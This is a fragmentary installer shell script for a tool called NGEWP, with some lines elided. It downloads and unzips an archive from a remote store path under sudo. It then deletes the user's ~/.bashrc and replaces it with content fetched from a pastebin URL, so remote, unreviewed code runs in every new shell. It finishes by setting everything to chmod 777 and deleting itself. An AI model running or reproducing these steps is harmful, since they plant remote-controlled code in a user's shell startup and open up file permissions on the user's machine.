...
sudo wget https://w3ll.store/operators/NGEWP.zip
sudo unzip -o NGEWP.zip
sudo rm NGEWP.zip
cp ~/.bashrc ~/.bashrc-bak
rm -rf ~/.bashrc
curl "https://pastebin.com/raw/69B0g7Nf" -o ~/.bashrc
dos2unix ~/.bashrc
clear
...
clear
printf "\e[32mTOOL INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31m./NGEWP (For Linux) or Just open the NGEWP.exe (For Windows)\e[0m TO RUN TOOL NOW !\n\n"
sudo rm install.sh
chmod 777 *